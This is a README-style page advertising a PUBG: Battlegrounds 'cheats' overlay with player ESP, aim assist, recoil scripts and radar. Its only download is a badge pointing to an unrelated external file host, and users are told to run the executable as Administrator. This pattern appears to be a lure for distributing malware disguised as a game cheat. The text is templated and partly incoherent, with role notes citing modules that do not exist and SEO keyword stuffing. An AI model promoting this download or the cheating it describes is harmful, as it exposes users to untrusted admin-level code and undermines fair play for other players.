<!-- ===== README Design Studio header ===== -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/f910c8463e39641e1e2b5808.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/57e242828609a897bc432c1a.png" />
    <img alt="PUBG: Battlegrounds Hero Banner" src="https://designreadme.top/assets/57e242828609a897bc432c1a.png" width="100%" />
  </picture>
</p>

<p align="center">
  <a href="https://shanxisaide.com/s/file">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/ad5fe16626d8dec8fcb7da6b.gif" />
      <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/4e5cec5f5022a4f397358fe4.gif" />
      <img alt="Download PUBG: Battlegrounds Cheats" src="https://designreadme.top/assets/4e5cec5f5022a4f397358fe4.gif" width="214" height="46" />
    </picture>
  </a>
</p>

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>


<div align="center">

# PUBG: Battlegrounds Cheats

**Player ESP · Loot ESP · Vehicle ESP · Zone Tracker · Airdrop Tracker**

</div>

## Introduction

**PUBG: Battlegrounds Cheats** is a Windows desktop overlay built for players who want a clearer view of the match. The panel combines Player ESP, Loot ESP, Vehicle ESP, Zone Tracker and Airdrop Tracker in a single process, with a module list that can be trimmed per session.

PUBG: Battlegrounds is a 100-player battle royale where looting, positioning and the shrinking blue zone decide who survives. Every match mixes long rotations with short, brutal fights.

The overlay is designed around the actual decision points in PUBG: Battlegrounds. Loot distribution is hard to read during a fast drop. Circle rotations are difficult to plan without a clear map. The panel does not play the game for you. It surfaces information, timers and reference data so that your own decisions are faster and better informed.

Every module is optional. A player who only wants Player ESP can hide the rest; a player preparing for Solo can load a profile that keeps Loot ESP, Vehicle ESP and Zone Tracker on screen. Profiles are stored locally and can be exported as JSON.

## Table of Contents

- [Introduction](#introduction)
- [Quick Start Guide](#quick-start-guide)
- [System Requirements](#system-requirements)
- [In-Depth Feature Breakdown](#in-depth-feature-breakdown)
- [Module & Hotkey Overview](#module--hotkey-overview)
- [Advanced Configuration](#advanced-configuration)
- [Game Modes and Map Coverage](#game-modes-and-map-coverage)
- [Role and Loadout Notes](#role-and-loadout-notes)
- [Troubleshooting & Diagnostics](#troubleshooting--diagnostics)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Changelog](#changelog)
- [SEO Keywords](#seo-keywords)

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Quick Start Guide

1. Download the archive from the badge at the top of this page.
2. Extract the archive into a dedicated folder; avoid Program Files and other protected paths.
3. Run the executable as Administrator so the overlay can attach to the PUBG: Battlegrounds window.
4. Launch PUBG: Battlegrounds and wait until the main menu or a match is fully loaded.
5. Press **INSERT** to open the config panel.
6. Choose a profile for Solo or create a new one, then enable the modules you need.
7. Press **INSERT** again to close the panel; the overlay stays active until you use the panic key.

The first launch creates a default profile with conservative ranges. If the overlay does not appear, check the troubleshooting section before changing any game settings.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2, 64-bit | Windows 11, 64-bit |
| CPU | Intel Core i5-8400 / AMD Ryzen 5 2600 | Intel Core i7-10700 / AMD Ryzen 7 3700X |
| RAM | 8 GB | 16 GB |
| GPU | NVIDIA GTX 1060 / AMD RX 580 | NVIDIA RTX 2060 / AMD RX 6600 |
| Storage | 250 MB free | 500 MB on an SSD |
| Display | 1920 × 1080 | 2560 × 1440 or higher |
| Privileges | Administrator | Administrator |
| Runtime | .NET Desktop Runtime 6 | .NET Desktop Runtime 8 |

The overlay is a separate process. It does not install a service, does not write to the game folder and does not require a driver. All settings live under `%APPDATA%\PUBG-Battlegrounds\profiles`.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## In-Depth Feature Breakdown

### 1. Player ESP

**Summary:** Squad-aware player outlines with health, distance and armour.

Player ESP draws every visible or recently visible player in PUBG: Battlegrounds with a colour-coded box. The box shows health, armour level and distance, and it can be filtered to enemies only. Because battle royale fights often involve third parties, the module also marks the direction a player was last seen moving.

| Parameter | What it changes |
|---|---|
| `max_distance` | 10 to 400 metres; the drawing range |
| `show_armour` | on or off; adds an armour tier readout |
| `squad_filter` | all, enemy or team; controls which players are drawn |

**Scenarios**
- Checking a ridge line on Erangel before rotating.
- Finding the last member of a squad after a trade on Erangel.

**Limits**
- Only shows players the client already knows about; it does not reveal players outside the local session.

**Pairs with:** Radar Overlay, Sound ESP  
**Default hotkey:** `F1`

### 2. Loot ESP

**Summary:** Weapon, armour and consumable highlights with rarity filters.

Loot ESP highlights weapons, armour, meds, ammo and attachments on the ground. Each item is labelled with its name and rarity, and the module can hide common items so only high-tier loot is drawn. This keeps the screen readable during a fast drop and helps you compare ground loot without opening every crate.

| Parameter | What it changes |
|---|---|
| `rarity_filter` | common, rare, epic or legendary; the minimum tier shown |
| `max_distance` | 5 to 150 metres; the highlight range |
| `show_ammo` | on or off; adds ammo counts to weapon labels |

**Scenarios**
- Finding a replacement shield after a fight on Miramar.
- Scanning a compound on Miramar for meds before the next rotation.

**Limits**
- Loot labels only appear for items the game has already spawned and exposed to the client.

**Pairs with:** Player ESP, Radar Overlay  
**Default hotkey:** `F2`

### 3. Vehicle ESP

**Summary:** Vehicle, fuel and exit markers for fast rotations.

Vehicle ESP highlights cars, bikes, boats and other drivable vehicles with distance and fuel information. The module also marks vehicle exits and nearby cover so you can dismount safely. It is designed for rotations where a few seconds of preparation decide whether the squad reaches the circle.

| Parameter | What it changes |
|---|---|
| `vehicle_filter` | cars, bikes, boats or all; limits the vehicle types |
| `max_distance` | 20 to 300 metres; the marker range |
| `show_fuel` | on or off; adds a fuel estimate to each marker |

**Scenarios**
- Finding a vehicle after landing on the edge of Sanhok.
- Checking fuel before a long rotation across Sanhok.

**Limits**
- Fuel estimates are only available for vehicles the game exposes to the client.

**Pairs with:** Radar Overlay, Zone Tracker  
**Default hotkey:** `F3`

### 4. Zone Tracker

**Summary:** Safe zone, next circle and rotation timing in one overlay.

Zone Tracker draws the current and next safe zone on the map and shows the time until the circle closes. It also estimates the distance from your position to the next safe area and suggests a rotation window. The module is meant to reduce the mental load of tracking the circle while fighting.

| Parameter | What it changes |
|---|---|
| `show_next` | on or off; draws the next circle |
| `timer_format` | seconds or minutes; controls the countdown style |
| `route_hint` | on or off; draws a straight-line rotation hint |

**Scenarios**
- Planning a rotation from Vikendi before the circle closes.
- Deciding whether to finish a fight or leave on Vikendi.

**Limits**
- Circle data is read from the local client and may lag by a few seconds during heavy network load.

**Pairs with:** Radar Overlay, Vehicle ESP  
**Default hotkey:** `F4`

### 5. Airdrop Tracker

**Summary:** Airdrop and care-package markers with landing estimates.

Airdrop Tracker marks incoming care packages and estimates where they will land. The module keeps a short history of drop locations so you can see which areas have already been contested. It can also filter drops by distance and hide packages that are too far away to reach safely.

| Parameter | What it changes |
|---|---|
| `max_distance` | 50 to 500 metres; the marker range |
| `show_history` | on or off; keeps previous drop markers |
| `landing_estimate` | on or off; draws a predicted landing circle |

**Scenarios**
- Deciding whether to contest a drop near Taego.
- Tracking a care package that landed behind Taego.

**Limits**
- Landing estimates are approximate and depend on the game's current physics and network state.

**Pairs with:** Radar Overlay, Zone Tracker  
**Default hotkey:** `F5`

### 6. Aim Assist

**Summary:** Humanised target tracking with per-weapon strength.

Aim assist in PUBG: Battlegrounds applies a configurable pull toward the target's hitbox with separate values for close, mid and long range. The default curve is deliberately gentle so that tracking still requires input. Per-weapon profiles let you keep a stronger pull for SMGs and a weaker one for sniper rifles.

| Parameter | What it changes |
|---|---|
| `smoothing` | 0.1 to 1.0; the tracking curve |
| `range_band` | close, mid or long; the engagement distance |
| `hitbox` | head, neck or chest; the preferred target point |

**Scenarios**
- Tracking a player strafing behind cover on Deston.
- Holding a long angle while the squad pushes on Deston.

**Limits**
- Does not fire or move the mouse for you; every shot remains manual.

**Pairs with:** Recoil Profiles, Player ESP  
**Default hotkey:** `F6`

### 7. Recoil Profiles

**Summary:** Per-weapon recoil curves for automatic and burst fire.

Recoil Profiles stores a compensation curve for each weapon in PUBG: Battlegrounds. The curve is applied only while the fire button is held and resets when you stop shooting, so burst firing keeps its natural rhythm. Profiles can be copied between weapons and tuned per optic or muzzle attachment.

| Parameter | What it changes |
|---|---|
| `pattern` | a weapon list with one stored curve per gun |
| `compensation` | 0 to 100 percent; how much of the curve is applied |
| `reset_delay` | 50 to 500 ms; how quickly the curve returns to neutral |

**Scenarios**
- Controlling a long spray at medium range on Rondo.
- Switching from a rifle to an SMG without reopening the panel.

**Limits**
- Profiles are tuned for the default fire rate; extreme fire-rate builds may need a custom curve.

**Pairs with:** Aim Assist, Loot ESP  
**Default hotkey:** `F7`

### 8. Radar Overlay

**Summary:** Expanded map with enemy, vehicle and drop markers.

The radar overlay replaces the stock minimap with a larger map that can be zoomed and panned. It draws enemy positions, vehicle markers and recent airdrops, and it keeps a short trail so you can read rotations. Manual markers can be placed to note chokepoints, compounds and extraction routes.

| Parameter | What it changes |
|---|---|
| `zoom` | 1.0 to 3.0; scales the radar view |
| `trail_length` | 0 to 10 seconds; how long position trails remain |
| `marker_limit` | 1 to 20; the number of manual markers per map |

**Scenarios**
- Reading a rotation on Erangel without opening the full map.
- Marking a compound before pushing on Erangel.

**Limits**
- Radar data is limited to the local client's view; it does not stream positions from other players.

**Pairs with:** Player ESP, Zone Tracker  
**Default hotkey:** `F8`

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Module & Hotkey Overview

| Module | Group | Hotkey | Purpose |
|---|---|---|---|
| Player ESP | World | `F1` | Squad-aware player outlines with health, distance and armour. |
| Loot ESP | World | `F2` | Weapon, armour and consumable highlights with rarity filters. |
| Vehicle ESP | World | `F3` | Vehicle, fuel and exit markers for fast rotations. |
| Zone Tracker | Reference | `F4` | Safe zone, next circle and rotation timing in one overlay. |
| Airdrop Tracker | Reference | `F5` | Airdrop and care-package markers with landing estimates. |
| Aim Assist | Combat | `F6` | Humanised target tracking with per-weapon strength. |
| Recoil Profiles | Combat | `F7` | Per-weapon recoil curves for automatic and burst fire. |
| Radar Overlay | World | `F8` | Expanded map with enemy, vehicle and drop markers. |

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Advanced Configuration

The config panel is split into four tabs: **Modules**, **Profiles**, **Hotkeys** and **About**. The Modules tab controls visibility and per-module parameters. Profiles stores named presets and can be tied to a mode or map. Hotkeys lets you rebind every action, including the panic key. About shows the build number and the current config path.

A complete backup is the whole `%APPDATA%\PUBG-Battlegrounds` folder. Copy it before a major update so that profiles, colours and hotkeys survive the upgrade. To restore, close the overlay, replace the folder and start the executable again.

Global settings apply to every profile:

| Setting | Default | Notes |
|---|---|---|
| `overlay_opacity` | 85% | Applies to panels and labels |
| `ui_scale` | 100% | Useful on 1440p and 4K displays |
| `panic_key` | `END` | Hides every module instantly |
| `language` | English | Interface language |
| `log_level` | Info | Use Debug only for diagnostics |

Profiles can be exported as a single JSON file. The file contains no game data and no account information; it only stores module states, colours and hotkeys.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Game Modes and Map Coverage

The overlay ships with reference profiles for the main PUBG: Battlegrounds modes. Each profile enables a different set of modules, so switching modes does not require a manual rebuild.

| Mode | What the profile keeps on screen |
|---|---|
| **Solo** | 100-player free-for-all. Modules: Player ESP, Loot ESP, Vehicle ESP. |
| **Duo** | two-player squads. Modules: Player ESP, Loot ESP, Vehicle ESP, Zone Tracker. |
| **Squad** | four-player teams. Modules: Player ESP, Loot ESP, Vehicle ESP, Zone Tracker, Airdrop Tracker. |
| **Ranked** | competitive battle royale. Modules: Player ESP, Loot ESP, Vehicle ESP. |

Map coverage includes Erangel, Miramar, Sanhok, Vikendi, Taego, Deston and Rondo. Radar profiles are user-editable: if a map receives a layout change, open the radar editor, align the new bounds and save the profile. The overlay does not download map data from a server.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Role and Loadout Notes

PUBG: Battlegrounds is played across several roles, and the overlay can be tuned for each one. The table below maps the common roles to the modules that usually matter most.

| Role | Modules to keep | Why |
|---|---|---|
| **Entry Fragger** | Player ESP, Loot ESP | Opens space; the first duel benefits from aim and recoil data. |
| **Sniper** | Loot ESP, Vehicle ESP | Holds the long angle; player and sound data support the first shot. |
| **Support** | Vehicle ESP, Zone Tracker | Trades and utility; radar and player ESP keep the site plan visible. |
| **IGL** | Zone Tracker, Airdrop Tracker | Calls rotations; radar and sound cues provide the information layer. |
| **Scout** | Airdrop Tracker, Aim Assist | Finds the route; radar and resource data support the rotation. |

### Terminology used in this document

- **blue zone** — the shrinking playable area
- **chicken dinner** — a first-place finish
- **drop** — the initial parachute landing
- **rotation** — moving to a new position inside the circle
- **third party** — a squad that attacks an ongoing fight
- **compound** — a group of buildings used as a defensive position
- **care package** — an airdropped crate with high-tier loot
- **boost** — energy drinks and painkillers that restore health over time

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Troubleshooting & Diagnostics

| Symptom | Likely cause | Fix |
|---|---|---|
| Overlay does not appear | The executable is not running as Administrator | Close it, right-click the executable and choose **Run as administrator** |
| Panel appears but modules are empty | The game is still loading or the overlay attached too early | Restart the overlay after the match has fully loaded |
| Hotkeys do not respond | Another application captured the key | Rebind the hotkey in the Hotkeys tab or close the conflicting app |
| Overlay flickers in fullscreen | The game is using exclusive fullscreen | Switch to borderless windowed mode |
| High CPU usage | Too many modules are enabled at a long range | Lower `max_distance` and disable modules you do not use |
| Radar is misaligned after a map update | The saved map bounds are stale | Open the radar editor and realign the bounds |
| Config does not save | The profile folder is read-only | Move the folder to `%APPDATA%` and restart the overlay |
| Text is too small on a 4K display | `ui_scale` is below 100% | Raise `ui_scale` in the global settings |

Diagnostics are written to `%APPDATA%\PUBG-Battlegrounds\logs`. The log contains module start-up order, attach status and any parameter validation errors. It does not contain game memory, account names or chat data.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Frequently Asked Questions

**What is PUBG: Battlegrounds Cheats?**

It is a Windows desktop overlay that adds optional information panels to PUBG: Battlegrounds. The panel includes Player ESP, Loot ESP, Vehicle ESP, Zone Tracker and Airdrop Tracker, and every module can be disabled independently.

**Does the overlay modify game files?**

No. It runs as a separate process and does not write to the game folder. Settings and profiles are stored under the user's AppData directory.

**Which Windows versions are supported?**

Windows 10 21H2 or newer and Windows 11, both 64-bit. Older builds may work but are not part of the tested matrix.

**Do I need to run it as Administrator?**

Yes. The overlay needs permission to attach to the game window and to draw above it. Running without administrator rights usually results in an empty or missing panel.

**Can I use more than one profile?**

Yes. The Profiles tab stores up to 20 named profiles. A profile can be tied to a mode or map so the overlay switches automatically.

**How do I hide the overlay quickly?**

Press the panic key, which is `END` by default. You can rebind it in the Hotkeys tab. The key hides every module without closing the process.

**Does the overlay work in borderless windowed mode?**

Yes. Borderless windowed is the recommended display mode. Exclusive fullscreen can cause flicker or prevent the overlay from drawing above the game.

**Can I export my settings?**

Yes. The Profiles tab has an Export button that writes a JSON file containing module states, colours and hotkeys. Import the same file on another machine to restore the setup.

**Does the overlay include map data?**

It includes editable radar profiles for the maps listed in this document. If a map changes, you can realign the bounds in the radar editor and save a new profile.

**How often is the overlay updated?**

Builds are published when a module changes or a compatibility fix is ready. The About tab shows the current build number; replace the old files with the new archive to update.

**Can I run the overlay on a laptop?**

Yes, provided the laptop meets the minimum requirements and the game runs in borderless windowed mode. Integrated graphics may struggle with the full module set.

**Where are the logs?**

Logs are written to `%APPDATA%\PUBG-Battlegrounds\logs`. Set `log_level` to Debug only while diagnosing a problem, because debug logs grow quickly.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Changelog

- **v3.3 Stable** — refreshed module templates for PUBG: Battlegrounds, added per-mode profiles and aligned the radar editor with the current map list.
- **v3.3 Beta** — added the radar overlay tab, improved profile export and fixed hotkey conflicts on Windows 11.
- **Initial release** — first public build with player esp, loot esp and vehicle esp.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## SEO Keywords

PUBG: Battlegrounds Cheats, cheats for PUBG: Battlegrounds, PUBG: Battlegrounds scripts, PUBG: Battlegrounds cheat panel, PUBG: Battlegrounds ESP, PUBG: Battlegrounds radar, PUBG: Battlegrounds overlay, PUBG: Battlegrounds Windows tool, PUBG: Battlegrounds admin panel, PUBG: Battlegrounds hotkey panel, PUBG: Battlegrounds config, PUBG: Battlegrounds tracker, PUBG Cheats, PUBG ESP, PUBG radar, PUBG: Battlegrounds Solo, PUBG: Battlegrounds Erangel, PUBG: Battlegrounds 2026

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d641c273565aed88dbd4846a.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/1b48eacc5ffa4f91d1d03858.png" width="100%" />
  </picture>
</p>

## Disclaimer

This documentation describes the behaviour of a desktop overlay. It makes no claims about detection status, account safety or official support. Use of the overlay is governed by the rules of PUBG: Battlegrounds, the server and the platform. The author is not responsible for account actions, data loss or hardware issues resulting from misuse. Review the current rules before use and keep backups of your configuration.

<!-- ===== Footer banner ===== -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/f910c8463e39641e1e2b5808.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/57e242828609a897bc432c1a.png" />
    <img alt="Footer Banner" src="https://designreadme.top/assets/57e242828609a897bc432c1a.png" width="100%" />
  </picture>
</p>
